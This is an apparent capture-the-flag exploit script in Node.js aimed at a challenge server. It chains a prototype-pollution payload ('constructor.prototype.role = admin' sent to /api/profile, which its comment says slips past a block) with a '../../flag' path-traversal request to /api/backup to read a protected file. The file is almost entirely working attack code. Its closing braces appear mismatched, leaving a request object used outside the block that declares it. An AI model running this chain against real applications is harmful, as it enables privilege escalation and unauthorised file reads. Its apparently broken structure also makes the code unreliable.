
const http = require('http');

// 1. First login existing user, poison prototype via /api/profile (this works because we use constructor.prototype which isn't blocked)
const existingUid = "50dca5dce7c748b394c1119db2d036b9";
const querystring = require('querystring');
const loginData = querystring.stringify({uid: existingUid});

const loginOpts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(loginData)
  }
};

console.log("👉 Step 1: Login existing user, poison Object.prototype.role = admin...");
const loginReq = http.request(loginOpts, (res) => {
  const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
  // Poison via /api/profile
  const poisonData = JSON.stringify({
    "uid": existingUid,
    "constructor": {
      "prototype": {
        "role": "admin"
      }
    }
  });
  const poisonOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(poisonData),
      'Cookie': cookie
    }
  };
  const poisonReq = http.request(poisonOpts, (poisonRes) => {
    let body = '';
    poisonRes.on('data', chunk => body += chunk);
    poisonRes.on('end', () => {
      console.log("✅ Step 1 done: Object.prototype.role = admin now!");
      console.log("👉 Step 2: Register NEW user, only send username, role inherited from prototype...");
      // Register new user, only username, no role needed
      const regData = querystring.stringify({username: "thisisit"});
      const regOpts = {
        hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
        port: 80,
        path: '/register',
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(regData)
        }
      };
      const regReq = http.request(regOpts, (regRes) => {
        let regBody = '';
        regRes.on('data', chunk => regBody += chunk);
        regRes.on('end', () => {
          let match = regBody.match(/<span.*?>([a-f0-9]+)<\/span>/);
          if (match) {
            let newUid = match[1];
            console.log(`✅ Registered new user, UID: ${newUid}`);
            console.log("👉 Step 3: Login new user, check role...");
            // Login new user
            const newLoginData = querystring.stringify({uid: newUid});
            const newLoginOpts = {
              hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
              port: 80,
              path: '/login',
              method: 'POST',
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(newLoginData)
              }
            };
            const newLoginReq = http.request(newLoginOpts, (newLoginRes) => {
              const newCookie = newLoginRes.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
              console.log("✅ Logged in, check profile...");
              const profileData = JSON.stringify({uid: newUid});
              const profileOpts = {
                hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
                port: 80,
                path: '/api/profile',
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                  'Content-Length': Buffer.byteLength(profileData),
                  'Cookie': newCookie
                }
              };
              const profileReq = http.request(profileOpts, (profileRes) => {
                let profileBody = '';
                profileRes.on('data', chunk => profileBody += chunk);
                profileRes.on('end', () => {
                  console.log("\n📄 Profile response:");
                  console.log(profileBody);
                  try {
                    let json = JSON.parse(profileBody);
                    console.log("\n🔍 Role:", json.role);
                    if (json.role === 'admin') {
                      console.log("\n🎉🎉🎉 WE DID IT! ADMIN! GET FLAG...");
                      const flagData = querystring.stringify({file: '../../flag'});
                      const flagOpts = {
                        hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
                        port: 80,
                        path: '/api/backup',
                        method: 'POST',
                        headers: {
                          'Content-Type': 'application/x-www-form-urlencoded',
                          'Content-Length': Buffer.byteLength(flagData),
                          'Cookie': newCookie
                        }
                      };
                      const flagReq = http.request(flagOpts, (flagRes) => {
                        let flagBody = '';
                        flagRes.on('data', chunk => flagBody += chunk);
                        flagRes.on('end', () => {
                          console.log("\n🏁🏁🏁 FINAL FLAG:");
                          console.log(flagBody);
                        });
                      });
                      flagReq.write(flagData);
                      flagReq.end();
                    }
                  } catch(e) {
                    console.log("Error", e);
                  }
                });
              });
              profileReq.write(profileData);
              profileReq.end();
            });
          };
          newLoginReq.write(newLoginData);
          newLoginReq.end();
        });
      });
      regReq.write(regData);
      regReq.end();
    });
  });
  poisonReq.write(poisonData);
  poisonReq.end();
});

loginReq.on('error', err => console.error(err));
loginReq.write(loginData);
loginReq.end();
